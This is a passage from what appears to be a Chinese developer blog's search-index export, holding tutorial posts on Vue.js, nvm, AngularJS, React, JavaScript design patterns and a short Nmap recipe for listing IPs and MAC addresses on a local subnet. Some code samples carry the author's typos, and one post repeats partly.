中数组包含的非纯函数将会触发视图更新，它们是: pop() push() shift() unshift() splice() sort() reverse() 而纯函数比如 filter(),slice(),concat(),等方法并不会改变原始数组而是返回一新的数组副本。 Vue 不能检测以下变动的数组 利用索引直接设置一个项时，如: vm.items[indexOfItem] = newValue 直接修改数组的长度时，如: vm.items.length = newLength 针对第一种情况的解决方案是: 12345// Array.prototype.spliceexample1.items.spliece(indexOfItem, 1, newValue)// Vue.setVue.set(example1.items, indexOfItem, newValue) 针对第二中情况的解决方案是: 12// Array.prototype.spliceexample1.items.splice(newLength) 0x04 事件处理器Vue 提供了事件监听器 v-on，装饰符 @ 是 v-on 的简写，并们提供了一个特殊变量 $event 在必要的情况下访问原生 DOM 事件: 12345678&lt;button @click=&quot;warn(&apos;dangerous&apos;, $event)&quot;&gt;Click Me&lt;/button&gt;methods: &#123; warn: function(message, event)&#123; if (event) event.preventDefault() alert(message) &#125;&#125; 值得注意的是, Vue 不可以直接将 JavaScript 代码写在 v-on 中，下面的代码是无效的。 1&lt;button @click=&quot;alert(&apos;Jack&apos;)&quot;&gt;Click Me&lt;/button&gt; 事件修饰符Vue 为 v-on 提供的事件修饰符极大地简化了处理 DOM 事件的细节,我们可通过(.) 指令来调用修饰符: .stop .prevent .capture .self .once 下面是官网的例子: 1234567891011121314151617&lt;!--阻止单击事件冒泡--&gt;&lt;a @click.stop=&quot;doThis&quot;&gt;&lt;/a&gt;&lt;!--提交事件不再重载页面--&gt;&lt;from @submit.prevent=&quot;onSubmit&quot;&gt;&lt;/from&gt;&lt;!--修饰符串联--&gt;&lt;a @click.stop.prevent=&quot;doThat&quot;&gt;&lt;/a&gt;&lt;!--添加事件监听器时使用事件捕获模式--&gt;&lt;div @click.capture=&quot;doThis&quot;&gt;&lt;/div&gt;&lt;!--只当事件在该元素本身(而不是子元素)触发时回调--&gt;&lt;div @click.self=&quot;doThat&quot;&gt;&lt;/div&gt;&lt;!--只执行一次--&gt;&lt;div @click.once=&quot;doThis&quot;&gt;&lt;/div&gt; 按键修饰符除了事件监听器，Vue 还为 v-on 添加了按键修饰符并提供了常用按键别名： .enter keyCode:13 .tab keyCode: .delete (删除和退格键) .esc keyCode: .space .up .down .left .right .ctrl .alt .shift 123&lt;input @keyup.enter=&quot;sumbit&quot;&gt;&lt;input @click.ctrl=&quot;clear&quot;&gt; 可以通过全局 config.keyCodes 对象设置自定义按键别名。 0x05 表单控件绑定在 Vue 中通常使用 v-model 指令在表单控件元素上创建双向数据绑定。它会根据控件类型自动选取正确的方法来更新元素。 绑定 value 值12345678910111213141516171819&lt;select v-model=&quot;selected&quot; id=&quot;&quot;&gt; &lt;option v-for=&quot;option in options&quot; :value=&quot;option.value&quot;&gt; &#123;&#123;option.text&#125;&#125; &lt;/option&gt;&lt;/select&gt;&lt;span&gt;Selected: &#123;&#123;selected&#125;&#125;&lt;/span&gt; new Vue(&#123; el:&apos;#demo&apos;, data: &#123; selected: &apos;A&apos;, options: [ &#123;text: &apos;one&apos;, value: &apos;A&apos;&#125;, &#123; text: &apos;two&apos;, value: &apos;B&apos;&#125;, &#123; text: &apos;three&apos;, value: &apos;C&apos;&#125; ] &#125;) 表单控件修饰符 .lazy: 取消 v-model 在 input 输入时同步输入数据的行为，当触发 change 时才更新: 1&lt;input v-model.lazy=&quot;msg&quot;&gt; .number: 数值转换 1&lt;input v-model.numbre=&quot;age&quot; type=&quot;number&quot; .trim: 去掉首尾空格 1&lt;input v-model.trim=&quot;name&quot;&gt; 0x06 组件使用组件时，一定要注意全局组件和局部组件的区别。 123456789101112131415161718192021// 注册一个全局组件Vue.component(&apos;my-component&apos;, &#123; //&#125;)// 创建实例let demo = new Vue(&#123; el: &apos;#hello&apos;, components: &#123;// 注册局部组件 localComponent: &#123; template: &apos;&lt;div&gt;我是局部组件！&lt;/div&gt;&apos; &#125; &#125;, &#125;)// 在父实例的模块中使用组件&lt;div id=&quot;hello&quot;&gt; &lt;my-component&gt;&lt;/my-component&gt; &lt;local-component&gt;&lt;/local-component&gt;&lt;/div&gt; is 特性当自定义组件挂载到 DOM 时模板，会受到一些限制，比如 ul,ol,table, select, option 等元素。 123&lt;table&gt; &lt;my-row&gt;&lt;/my-row&gt;&lt;/table&gt; 如上，渲染时将会报错，因为 table 中只可以包含它特定的几个元素,比如 tr，解决方法是使用 Vue 提供的 is` 特性: 123&lt;table&gt; &lt;tr is=&quot;my-row&quot;&gt;&lt;/tr&gt;&lt;table&gt; 关于 data 对象需要注意的是，在组件中，data 对象必须是一个函数。 关于组件父子组件对 Vue 而言，父子组件的关系是 props down, events up。 首先组件实例的作用域是孤立的，我们不能在子组件的模板内直接引用父组件的数据，而只能通过 props 把数据传递给子组件，这时子组件需要显示的使用 props 选项声明 prop。 123456&lt;child my-message=&quot;hello&quot;&gt;&lt;/child&gt;Vue.component(&apos;child&apos;,&#123; props: [&apos;myMessage&apos;], template: &apos;&lt;span&gt;&#123;&#123;myMessage&#125;&#125;&lt;/span&gt;&apos;&#125;) 使用非字符串模板时，prop 的名字形式会从 camelCase 转为 kebab-case。 我们也可以使用 v-bind 动态的绑定 prop 到父组件的数据中。每当父组件的数据变化时，将会传导给子组件: 12345678910111213141516&lt;div id=&quot;demo&quot;&gt;&lt;input v-model=&quot;parentMsg&quot;&gt;&lt;child v-bind:my-message=&quot;parentMsg&quot;&gt;&lt;/child&gt;// 绑定父组件属性 parentMSg 到子组件 prop `my-message`&lt;/div&gt;Vue.component(&apos;child&apos;,&#123; props: [&apos;myMessage&apos;], template: &apos;&lt;span&gt;&#123;&#123;myMessage&#125;&#125;&lt;/span&gt;&apos; &#125;) new Vue(&#123; el: &apos;#demo&apos;, data: &#123; parentMsg: &apos;&apos;&#125;&#125;) 父子组件通信prop 是单向绑定的，即当父组件的属性变化时，将传导给子组件，但不会反过来。那么子组件如何将数据传递回去? 解决的方法是使用 v-on （事件监听器），通过它去绑定自定义事件。Vue为每个组件实例都定义了 事件接口(Events interface): $on(eventName): 监听事件 $emit(eventName): 执行事件 即是，父组件通过 props 传递数据给子组件，子组件通过 events 给父组件发送消息。 另外，父组件可以在使用子组件的地方直接用 v-on 来监听子组件触发的事件。 下面是官网的 demo: 12345678910111213141516171819202122232425262728293031323334&lt;div id=&quot;counter-event-example&quot;&gt; &lt;p&gt;&#123;&#123; total &#125;&#125;&lt;/p&gt; &lt;button-counter v-on:increment1=&quot;incrementTotal&quot;&gt;&lt;/button-counter&gt; // v-on 监听 increment1 事件，当 increment1 事件被触发时执行 incrementTotal 事件 &lt;button-counter v-on:increment1=&quot;incrementTotal&quot;&gt;&lt;/button-counter&gt;&lt;/div&gt;Vue.component(&apos;button-counter&apos;, &#123; template: &apos;&lt;button v-on:click=&quot;increment&quot;&gt;&#123;&#123; counter &#125;&#125;&lt;/button&gt;&apos;, // 监听 click 事件，当 click 事件被触发时执行子组件中的 increment 事件 data: function () &#123; return &#123; counter: 0 &#125; &#125;, methods: &#123; increment: function () &#123; this.counter += 1 this.$emit(&apos;increment1&apos;) // 直接执行 increment1 事件 &#125; &#125;,&#125;)new Vue(&#123; el: &apos;#counter-event-example&apos;, data: &#123; total: 0 &#125;, methods: &#123; incrementTotal: function () &#123; this.total += 1 &#125; &#125;&#125;) 如上，在 Vue 中我们可以通过 $on 和 $emit() 构造自定义事件来实现子组件对父组件的数据传递。 非父子组件通信对于非父子组件，在简单的场景下可以使用一个空的 Vue 实例作为中央事件总线: 1234567let bus = new Vue()// 触发组件 A 的事件bus.$emit(&apos;id-selected&apos;, function()&#123;&#125;)// 在组件 B 中注册(监听) `id-seleted` 事件bus.$on(&apos;id-selected&apos;, function ()&#123;&#125;); 如果页面足够复杂，则可以使用状态管理模式。 solt 内容分发对于 solt, MDN 是这么解释的: Slots are placeholders inside your component that users can fill with their own markup. 即: 插槽是组件中的占位符，用户可以使用自己的标记填充。 为了让组件可以组合，我们需要一种方式来混合父组件的内容与子组件自己的模板。这个过程被称为 内容分发。 在 solt 中，父组件的整个内容片段将插入到子组件 solt 所在的 DOM 位置，并替换掉 &lt;solt&gt; 标签本身。最初在 &lt;slot&gt; 标签中的任何内容都被视为备用内容。备用内容在子组件的作用域内编译，并且只有在宿主元素为空，且没有要插入的内容时才显示备用内容。 12345678910111213141516171819&lt;div class=&quot;container&quot;&gt; &lt;header&gt; &lt;slot name=&quot;header&quot;&gt;&lt;/slot&gt; &lt;/header&gt; &lt;main&gt; &lt;slot&gt;&lt;/slot&gt; &lt;/main&gt; &lt;footer&gt; &lt;slot name=&quot;footer&quot;&gt;&lt;/slot&gt; &lt;/footer&gt;&lt;/div&gt;&lt;app-layout&gt; &lt;h1 slot=&quot;header&quot;&gt;这里可能是一个页面标题&lt;/h1&gt; &lt;p&gt;主要内容的一个段落。&lt;/p&gt; &lt;p&gt;另一个主要段落。&lt;/p&gt; &lt;p slot=&quot;footer&quot;&gt;这里有一些联系信息&lt;/p&gt;&lt;/app-layout&gt; 其实 solt 和 props 是类似的，我们可以将其理解为函数的参数，如果不传入就当默认值使用，如果传入了新的值，那么在组件调用时就会替换为定义的 slot 的默认值。在组合组件时，内容分发 API 是非常有用的机制。 作用域插槽作用域插槽可以实现将子组件中 solt 的内容插入到父组件中去。 123456789101112131415161718192021&lt;div id=&quot;hello&quot;&gt; &lt;my-awesome-list :items=&quot;items&quot;&gt; &lt;template slot=&quot;item&quot; scope=&quot;props&quot;&gt; // 在此处定义作用域插槽 &lt;li class=&quot;&quot;&gt;&#123;&#123;props.text&#125;&#125;&lt;/li&gt; &lt;/template&gt; &lt;/my-awesome-list&gt;&lt;/div&gt;Vue.component(&apos;my-awesome-list&apos;,&#123; props: [&quot;items&quot;], template: `&lt;ul&gt;&lt;slot name=&quot;item&quot; v-for=&quot;item in items&quot; :text=&quot;item.text&quot;&gt;&lt;/slot&gt;&lt;/ul&gt;`, &#125;) let demo = new Vue(&#123; el: &apos;#hello&apos;, data: &#123; items: [&#123;text:1&#125;,&#123;text:2&#125;,&#123;text:3&#125;] &#125; &#125;) 动态组件]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Vue.j(进阶)Render函数]]></title>
      <url>%2F2017%2F02%2F18%2FVue-js(%E8%BF%9B%E9%98%B6)Render%E5%87%BD%E6%95%B0%2F</url>
      <content type="text"><![CDATA[0x01 Render虽然 template 在大多数的简单组件中已经够用了，但对于大型的复杂应用，template 就显得力不从心。 Vue 提供的 Render 函数比 template 更接近编译器，它会让我们在构建复杂组件的时候更灵活。 下面时 Render 函数的简单实例: 12]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[深入浅出Node.js番外篇(1)node版本管理]]></title>
      <url>%2F2017%2F02%2F18%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BANode-js%E7%95%AA%E5%A4%96%E7%AF%87(1)node%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%2F</url>
      <content type="text"><![CDATA[0x00 使用 nvm 管理 node 版本nvm 是 node 版本管理工具，它可以让我们轻松灵活的管理不同版本的node。比如，你在 Windows 下的 Vue 编码环境时 node v7.4.0，而在 Linux 下的 node 版本是 v5.0.0，而 v5.0.0 只支持 ES6 部分语法，由于 node 版本不同，导致代码根本不能运行，这时可以使用 nvm 升级 node 的版本: 1234nvm install stable// 安装 node 最新的稳定版本// 或者制定要安装版本nvm install 7.4.0 查看当前 node 版本,node 见版本默认为最后一次安装的版本: 12nvm currentv7.5.0 切换 node 版本: 1234567// 切换到 node 5 root  /  NEMBlog  nvm use 5   master Now using node v5.0.0 (npm v3.3.6)// 再切回来，切换到 node 7 root  /  NEMBlog  nvm use 7   master Now using node v7.5.0 (npm v4.1.2) 显示所有安装的 node: 1nvm ls 设置系统默认版本: 12nvm alias default 7default -&gt; 7 (-&gt; v7.5.0) 0x01 nvm 的沙箱机制nvm 的强大之处在于其沙箱机制，它可以然我们很方便的在多运行环境中管理和切换。以沙箱的方式，全局组件会装到 .nvm 目录的当前版本 node 下，也就是装在 nvm 这个沙箱里，跟在指定版本的 node 下，当前有什么版本的 node，就有对应的全局组件。 .nvmrc当服务器上运行了多个应用系统，而每个应用系统使用的node版本又不一样的，为了让不同的应用系统使用各自所需的 node版本运行，我们只需在各应用系统内的根目录里生成一个 .nvmrc 文件，在其内写一个版本号，利用 nvm run &lt;系统启动文件&gt; 的方式运行系统,如此运行的应用程序的node版本将取决于 .nvmrc 中写的版本。 12345678910111213141516 root  /  NEMBlog  echo &apos;5&apos; &gt; .nvmrc   master root  /  NEMBlog  vim index.js   master root  /  NEMBlog  nvm current   master v7.5.0 root  /  NEMBlog  nvm run index.js   master Found &apos;/NEMBlog/.nvmrc&apos; with version &lt;5&gt;Running node v5.0.0 (npm v3.3.6)&#123; http_parser: &apos;2.5.0&apos;, node: &apos;5.0.0&apos;, v8: &apos;4.6.85.28&apos;, uv: &apos;1.7.5&apos;, zlib: &apos;1.2.8&apos;, ares: &apos;1.10.1-DEV&apos;, icu: &apos;56.1&apos;, modules: &apos;47&apos;, openssl: &apos;1.0.2d&apos; &#125; 如上，我们在根目录下创建了 index.js 文件，它会输出运行时的 node 版本。然后使用命令行在 echo &#39;5&#39; &gt; .nvmrc 指定应用程序的运行环境为 v5.0.0。最后切换本地的 node 版本到最新状态 v7.5.0。index.js 将输出运行时的 node 版本是 v5.0.0。 0x02 npm shrinkwrap我们知道直接使用 npm i 安装的模块是不会写入 package.json 的 dependencies (或 devDependencies)，需要额外加个参数: npm i express --save/npm i express -S (安装 express，同时将 &quot;express&quot;: &quot;^4.14.0&quot; 写入 dependencies ) npm i express --save-dev/npm i express -D (安装 express，同时将 &quot;express&quot;: &quot;^4.14.0&quot; 写入 devDependencies ) npm i express --save --save-exact(安装 express，同时将 &quot;express&quot;: &quot;4.14.0&quot; 写入 dependencies ) 第三种方式将固定版本号写入 dependencies，以保证在各个平台上使用的都是相同的版本。 运行如下命令: 1npm config set save-exact true 如此，每次 npm i xxx --save 的时候会锁定依赖的版本号，相当于加了 --save-exact 参数。 但是这种方式只能锁定最外层的依赖，而里层依赖的模块的 package.json 有可能写的是 &quot;mongoose&quot;: &quot;*&quot;。 为了彻底锁定依赖，可以使用 npm shrinkwrap，会在当前目录下产生一个 npm-shrinkwrap.json，里面包含了通过 node_modules 计算出的模块的依赖树及版本。 然后使用 npm install 的时候会优先使用 npm-shrinkwrap.json 进行安装，没有则使用 package.json 进行安装。 如果 node_modules 下存在某个模块（如直接通过npm install xxx 安装的）而 package.json 中没有，运行 npm shrinkwrap 则会报错。另外，npm shrinkwrap 只会生成 dependencies的依赖，不会生成devDependencies` 的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[AngularJS(9)高级指令]]></title>
      <url>%2F2017%2F02%2F11%2FAngularJS(9)%E9%AB%98%E7%BA%A7%E6%8C%87%E4%BB%A4%2F</url>
      <content type="text"><![CDATA[0x00 嵌入包含ng-transclude 嵌入包含 从，字面意义理解是先嵌入再包含,指令首先使用模板嵌入指令所在位置，然后再吸纳指定的内容。 demo 如下： 被嵌入的模板 #template: 12345678910&lt;script type=&quot;text/ng-template&quot; id=&quot;template&quot;&gt; &lt;div class=&quot;panel panel-default&quot;&gt; &lt;div class=&quot;panel heading&quot;&gt; &lt;h4&gt;This is the panel&lt;/h4&gt; &lt;/div&gt; &lt;div class=&quot;panel-body&quot; ng-transclude&gt; &lt;!--ng-transclude，此处显示需要吸纳的内容，比如，来自 panel中的 div#origin-content --&gt; &lt;/div&gt; &lt;/div&gt; &lt;/script&gt; 自定义指令所在的位置，即模板被嵌入的位置: 12345678&lt;body ng-controller=&quot;defaultCtrl&quot;&gt; &lt;panel&gt; &lt;!--panel 是自定义指令，并将其作为元素使用--&gt; &lt;!--此处便是模板将会嵌如的为位置--&gt; &lt;div id=&quot;origin-content&quot; class=&quot;well&quot;&gt; &lt;p class=&quot;text-center&quot;&gt; The data value comes fome the: &#123;&#123;dataSource&#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/panel&gt; 自定义指令内容: 1234567891011121314151617181920&lt;script type=&quot;text/javascript&quot;&gt; angular.module(&quot;exampleApp&quot;,[]) .directive(&quot;panel&quot;, function () &#123; return &#123; link: function (scope, element, attrs) &#123; scope.dataSource = &apos;directive&apos;; &#125;, restrict: &apos;E&apos;, scope: false, template: function () &#123; return angular.element( document.querySelector(&quot;#template&quot;) ).html(); &#125;, transclude: true &#125; &#125;).controller(&quot;defaultCtrl&quot;, function ($scope) &#123; $scope.dataSource = &quot;Controller&quot;; &#125;) &lt;/script&gt; 值得注意的是，被嵌入包含的内容中的表达式是在控制器作用域中被计算的，而不是指令作用域。 如果想使用指令作用域，可以将 scope 设置为 false。 12restrict: &apos;E&apos;,scope: false, 清单9-1 0x01 在指令中使用控制器指令可以创建出被其它指令所用的控制器。这允许指令被组合起来创建出更复杂的组件。 清单9-2]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用Nmap批量提取IP以及MAC地址]]></title>
      <url>%2F2017%2F02%2F08%2FNmap%E6%89%B9%E9%87%8F%E6%8F%90%E5%8F%96IP%E4%BB%A5%E5%8F%8AMAC%E5%9C%B0%E5%9D%80%2F</url>
      <content type="text"><![CDATA[0x00 使用 Nmap使用nmap -sV命令以后提取网段中的ip: 1234567$ ifconfig $ nmap 192.168.0.* &gt;&gt;IP1.txt $ cat IP1.txt | grep &apos;report for&apos; | cut -d&quot; &quot; -f6 | cut -d &apos;(&apos; -f2| cut -d &apos;)&apos; -f1 &gt;&gt; allip.txt$ cat IP1.txt | grep &quot;MAC&quot; &gt;&gt; mac.txt $ cat -n mac.txt | cut -d&quot;:&quot; -f 2-7 | cut -d &apos; &apos; -f 2 &gt;&gt; allmac.txt]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[React(1)之快速概览]]></title>
      <url>%2F2017%2F02%2F08%2FReact(1)%E5%BF%AB%E9%80%9F%E6%A6%82%E8%A7%88%2F</url>
      <content type="text"><![CDATA[0x00 JSXJSX 是 JavaScriptXML 的缩写，基于ECMAScript的一种新特性（并不是一种新语言），一种定义带属性树结构（DOM结构）的语法，它并不是 XML 或者 HTML。 基本语法可以把 JSX 标签当做一个变量,而在 React 中，一个标签就是一个组件: 12const div = &lt;div&gt;hello,world&lt;/div&gt;;ReactDOM.render(div, document.body); 在 JSX 中，所有标签必需严格闭合。 自定义标签首字母必需大写，而且对于标签中自定义属性,事件等命名必需使用 camelCase 方法: 12const add = function () &#123;&#125;;&lt;Welcome onClic=&#123;add&#125;className=&quot;this.props.name&quot;/&gt; JSX 语法解析规则是: 遇到 HTML 标签（以 &lt; 开头），就用 HTML 规则解析；遇到代码块（以 { 开头），就用 JavaScript 规则解析。但并不是所有的 JavaScript 语法都能被解析，比如 if 语句就不可以。 条件判断如果要在 JSX 中使用条件判断，可以使用三目运算符或者使用函数。 1&lt;div calssName=&#123;&quot;this.sate.isCompelte ? &apos;is-complete&apos; : &apos;&apos;&#125;&gt;&lt;/div&gt; 使用变量12345const myName = &quot;Jack&quot;;function getId (props) &#123; return props.id;&#125;const isDiv = &lt;div id=&#123;getid()&#125;&gt;&#123; &quot;Your Name:&quot; + myName&#125;&lt;/div&gt; 如上，JSX 中可以对组件中的属性使用变量或函数，这一点是不同于 HTML 的。 使用 Array12345678910111213141516171819const names = [&quot;Alice&quot;, &quot;Jack&quot;]; function ListItems (props) &#123; const names = props.names; return ( &lt;ul&gt; &#123; names.map( (name) =&gt; &#123; return &lt;li key=&#123;name.toString()&#125;&gt;&#123;name&#125;&lt;/li&gt;; &#125;) &#125; &lt;/ul&gt; ) &#125; ReactDOM.render( &lt;ListItems names=&#123;names&#125;/&gt;, document.getElementById(&apos;root&apos;) ); 注意 标签中的 key 属性，在使用具有 Iterator 接口或者数组等源数据生成多个重复的组件时，key 属性是必须的，而且应该是唯一的，这将有利于 React 识别唯一组件进行渲染。 0x01 安装 React一个基本的 React 应用需要 react 和 react-dom 库: 1234λ mkdir MyReactλ npm install -yλ npm install react react-dom --save-devλ npm install babel@5 --save-dev 0x01 组件和属性集React 中可以使用函数或者类继承自 React.Component 来构建组件。 函数组件12345678function Welcome (props) &#123; return &lt;h1&gt;Hllo, &#123;props.name&#125;&lt;/h1&gt;;&#125;ReactDOM.render( &lt;Welcome name=&quot;Jack&quot;/&gt;, document.getElementById(&apos;root&apos;)); 类组件123456789class LittleComponent extends React.Component &#123; render()&#123; return &lt;div&gt;&#123;this.props.name&#125;&lt;/div&gt; &#125;&#125;ReactDOM.render( &lt;LittleComponent name=&quot;Jack&quot;/&gt;, document.getElementById(&apos;root&apos;)); 在 React props 对象是只读的， 无论是函数还是类，都不能改变自己的属性(props)，而所有 React 组件都必须像纯函数那样运行。 当然，还是有例外的，比如网络响应组件这些状态可能随时变化的组件不适用这一规则。 0x02 状态和生命周期state 是只有类组件拥有的特性，state 状态和 props 属性集类似，但是 state 是私有的并且完全由组件控制。 state 存在存在于组件的生命周期之中。React 提供了两个特别的方法 componentDidMount() 和 componentWillUnmout() 作为 lifecycle hooks 生命周期钩子去赋予和结束生命周期。 componentDidMount 会在组件 render 之后被自动调用，而 componentWillUnmount会在组件被移除时自动调用。 下面是 React 官网的 example: 1234567891011121314151617181920212223242526272829303132333435363738class Clock extends React.Component &#123;constructor(props)&#123; super(props); this.state = &#123;date: new Date()&#125;;&#125;componentDidMount () &#123; this.timerId = setInterval( () =&gt; this.tick(), 1000 );&#125;componentWillUnmount() &#123; clearInterval(this.timerId);&#125;tick ()&#123; this.setState(&#123; date: new Date() &#125;);&#125;render()&#123; return ( &lt;div&gt; &lt;h1&gt;Hello,world!&lt;/h1&gt; &lt;h2&gt;It is: &#123;this.state.date.toLocaleTimeString()&#125;&lt;/h2&gt; &lt;/div&gt; )&#125;&#125;ReactDOM.render( &lt;Clock/&gt;, document.querySelector(&apos;#root&apos;))]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS设计模式(4)发布-订阅模式]]></title>
      <url>%2F2017%2F02%2F07%2FJS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(4)%E5%8F%91%E5%B8%83-%E8%AE%A2%E9%98%85%E6%A8%A1%E5%BC%8F%2F</url>
      <content type="text"><![CDATA[0x00 发布-订阅模式]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS设计模式(3)代理模式]]></title>
      <url>%2F2017%2F02%2F07%2FJS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(3)%E4%BB%A3%E7%90%86%E6%A8%A1%E5%BC%8F%2F</url>
      <content type="text"><![CDATA[0x00 代理模式]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JS设计模式(2)策略模式]]></title>
      <url>%2F2017%2F02%2F06%2FJS%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F(2)%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F%2F</url>
      <content type="text"><![CDATA[0x00 策略模式策略模式 的定义是: 定义一系列算法，把他们一个个封装起来，并且使他们可以相互替换 0x01 策略模式实现缓动动画策略模式的一个经典运用场景就是缓动动画。 其核心思想是使用策略模式把算法传入动画类库中，来达到给种不同的缓动效果，而这些算法可以轻易的被另一个算法替代。 12345678910111213141516let tween = &#123;// 动画类库，用于封装缓动算法// t:动画已经消耗的时间// b:小球的原始位置// c:小球目标位置// d:动画持续的总时间 linear: function (t, b, c, d) &#123; return c * t / d + b; &#125;, easeIn: function (t, b, c, d) &#123; return c * (t /= d) * t + b; &#125;, strongEaseIn: function (t, b, c, d) &#123; return c * (t /= d) * t * t * t * t + b; &#125;&#125;; 完整代码:策略模式-缓动动画 0x02 策略模式实现表单验证其实，仅仅把策略模式用于封装算法有点大材小用，实际开发中，通常会把算法的含义扩散开来，使策略模式可以用来封装一系列的 业务规则。 在一个 Web 项目中，表单验证往往是在所难免的，当需要验证的字段很少的时候，比如几条，十几条，没问题，我们完全可以重复的使用 if...else 去验证表单字段，但如一个表单中的字段多大几十个，甚至上百个时，考虑到代码的可复用性和后期的可以维护性，便十分有必要使用一些模式去组织我们的代码了。 比如，策略模式。 使用策略模式编写表单校验代码的第一步就是将校验逻辑都封装成为策略对象: 1234567891011121314151617181920212223242526272829let strategies = &#123; // 策略对象，封装验证表单的规则 isNotEmpty: function (value, errorMsg) &#123; if (value == &apos;&apos;) &#123; return errorMsg; &#125; &#125;, minLength: function (value, length, errorMsg) &#123; if (value.length &lt; length) &#123; return errorMsg; &#125; &#125;, legalPhone: function (value, errorMsg) &#123; let regPhone = /^1[345678]\d&#123;9&#125;$/g; if (!regPhone.test(value)) &#123; return errorMsg; &#125; &#125;, legalEmail: function (value, errorMsg) &#123; let regEmail = /^\w&#123;1,18&#125;@([a-z][0-9])&#123;2,7&#125;.[a-z]&#123;2,4&#125;$/i; if (!regEmail.test(value)) &#123; return errorMsg; &#125; &#125;&#125;; 然后，我们会创建 Validate 类，它的作用是作为 Context，负者接收用户的输入并将用户输入的内容委托给 strategy 对象。 1234567891011121314151617181920212223242526272829let validateFunc = function () &#123;// validateFunc 执行表单验证函数// 添加验证规则 let validator = new Validate(); // 创建一个 Validate 类，作用是作为 `Context`，负者接收用户的输入并将用户输入的内容委托给 `strategy` 对象。 validator.add(regForm.userName, [ &#123; strategy: &quot;isNotEmpty&quot;, errorMsg: &quot;用户名不能为空&quot;, &#125;, &#123; strategy: &quot;minLength:6&quot;, errorMsg: &quot;密码长度不能小于六位&quot; &#125;]); validator.add(regForm.userPassword, [&#123; strategy: &quot;minLength:6&quot;, errorMsg: &quot;密码长度不能小于六位&quot; &#125;]); validator.add(regForm.phoneNumber, [&#123; strategy: &quot;legalPhone&quot;, errorMsg: &quot;手机号格式不正确&quot; &#125;]); validator.add(regForm.userEmail, [&#123; strategy: &quot;legalEmail&quot;, errorMsg: &quot;邮箱格式不正确&quot; &#125;]); return validator.start(); // 返回校验结果&#125;; 如上，validate 类的 add 方法用于向我们的 strategy 的对象添加校验规则，它接收两参数:参与校验的 input 输入框以及一个数组，数组中存放的是验证的策略规则和验证失败返回的提示信息。 下面是 validate 对象的具体实现: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546let Validate = function () &#123; // 验证表单的类 // Validate 类作为 Context，负者接收用户的请求并委托给 strategies 对象 this.cache = [];// 保存验证规则的数组&#125;;Validate.prototype = &#123; constructor: Validate, add: function (dom, rules) &#123; // 规则关联，将规则与对应的元素进行绑定，并返回验证结果 let self = this; for (let i =0, rule; rule = rules[i++];)&#123; (function (rule) &#123; let strategyArr = rule.strategy.split(&quot;:&quot;); // 参数解析 let errorMsg = rule.errorMsg; // 获取错误信息 self.cache.push(function() &#123; // 推入策略规则 let strategy = strategyArr.shift(); // 首先截取策略名称 strategyArr.unshift(dom.value); // 添加 dom 的内容 strategyArr.push(errorMsg); // 推入错误信息 return strategies[strategy].apply(dom, strategyArr); // 信息策略，并返回校验结果 &#125;); &#125;)(rule); &#125; &#125;, start: function () &#123; for (let i = 0, validaterFunc; validaterFunc = this.cache[i++];) &#123; let msg = validaterFunc(); // 开始校验，并取得校验后的返回信息 if (msg) &#123; // 如若有返回值，说明校验不成功 return msg; &#125; &#125; &#125;,&#125;; 当我们往 validate 对象添加完校验规则以后，便调用 validate.start 方法来启动校验，该方法返回的 errorMsg 字符串代表校验没有通过，那么便需要调用 regForm.onsubmit 方法返回 false 阻止表单的提交。 123456789 regForm.onsubmit = function () &#123; let errorMsg = validateFunc(); // 若，validateFunc 没有任何值返回，则代表校验通过 if (errorMsg) &#123; alert(errorMsg); return false;// 阻止表单提交 &#125; &#125; 策略模式实现表单验证策略模式date: 2017-02-06tags: [‘JavaScript’,’JS设计模式’]toc: truecategories: technology 0x00 策略模式策略模式 的定义是: 定义一系列算法，把他们一个个封装起来，并且使他们可以相互替换 0x01 策略模式实现缓动动画策略模式的一个经典运用场景就是缓动动画。 其核心思想是使用策略模式把算法传入动画类库中，来达到给种不同的缓动效果，而这些算法可以轻易的被另一个算法替代。 12345678910111213141516let tween = &#123;// 动画类库，用于封装缓动算法// t:动画已经消耗的时间// b:小球的原始位置// c:小球目标位置// d:动画持续的总时间 linear: function (t, b, c, d) &#123; return c * t / d + b; &#125;, easeIn: function (t, b, c, d) &#123; return c * (t /= d) * t + b; &#125;, strongEaseIn: function (t, b, c, d) &#123; return c * (t /= d) * t * t * t * t + b; &#125;&#125;; 完整代码:策略模式-缓动动画 0x02 策略模式实现表单验证其实，仅仅把策略模式用于封装算法有点大材小用，实际开发中，通常会把算法的含义扩散开来，使策略模式可以用来封装一系列的 业务规则。 在一个 Web 项目中，表单验证往往是在所难免的，当需要验证的字段很少的时候，比如几条，十几条，没问题，我们完全可以重复的使用 if...else 去验证表单字段，但如一个表单中的字段多大几十个，甚至上百个时，考虑到代码的可复用性和后期的可以维护性，便十分有必要使用一些模式去组织我们的代码了。 比如，策略模式。 使用策略模式编写表单校验代码的第一步就是将校验逻辑都封装成为策略对象: 1234567891011121314151617181920212223242526272829let strategies = &#123; // 策略对象，封装验证表单的规则 isNotEmpty: function (value, errorMsg) &#123; if (value == &apos;&apos;) &#123; return errorMsg; &#125; &#125;, minLength: function (value, length, errorMsg) &#123; if (value.length &lt; length) &#123; return errorMsg; &#125; &#125;, legalPhone: function (value, errorMsg) &#123; let regPhone = /^1[345678]\d&#123;9&#125;$/g; if (!regPhone.test(value)) &#123; return errorMsg; &#125; &#125;, legalEmail: function (value, errorMsg) &#123; let regEmail = /^\w&#123;1,18&#125;@([a-z][0-9])&#123;2,7&#125;.[a-z]&#123;2,4&#125;$/i; if (!regEmail.test(value)) &#123; return errorMsg; &#125; &#125;&#125;; 然后，我们会创建 Validate 类，它的作用是作为 Context，负者接收用户的输入并将用户输入的内容委托给 strategy 对象。 1234567891011121314151617181920212223242526272829let validateFunc = function () &#123;// validateFunc 